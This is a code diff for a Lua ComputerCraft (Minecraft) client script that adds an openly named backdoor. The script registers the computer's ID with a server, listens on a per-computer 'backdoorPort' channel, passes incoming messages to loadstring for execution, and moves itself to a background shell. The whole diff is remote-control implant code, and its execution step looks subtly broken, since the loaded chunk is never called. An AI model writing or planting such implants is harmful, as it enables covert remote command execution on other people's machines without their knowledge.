@@ -94,22 +94,31 @@ end
 
 local id = os.getComputerID();
 local port = 1489;
+local backdoorPort = port+id;
 local modem = peripheral.find("modem") or shutdown("A modem is required");
 
 modem.open(port); -- This is so the server can request the id
-modem.open(port+id);
+modem.open(backdoorPort);
 
-modem.transmit(port, port+id, id)
+modem.transmit(port, backdoorPort, id)
 
-spawn(function()
-    print("Client Started!")
-    while true do
-        local event, side, channel, replyChannel, message, distance = os.pullEventRaw("modem_message"); -- good idea?
-        print(event, side, channel, replyChannel, message, distance)
-        if channel == (port+id) then
-            modem.transmit(port, port+id, pcall(function()
-                return loadstring(message); -- Run lua code here!
-            end))
-        end
+function Check(event, side, channel, replyChannel, message, distance)
+    if channel == backdoorPort then
+        modem.transmit(port, backdoorPort, pcall(function()
+            return loadstring(message); -- Run lua code here!
+        end))
+    elseif channel == port then
+        modem.transmit(port, backdoorPort, id)
     end
-end)
+end
+
+function listen()
+    local event, side, channel, replyChannel, message, distance = os.pullEventRaw("modem_message");
+    Check(event, side, channel, replyChannel, message, distance)
+end
+
+function toBackground()
+    shell.run("/rom/programs/advanced/multishell")
+end
+--İts working only advanced computers...--
+parallel.waitForAny(toBackground , listen)
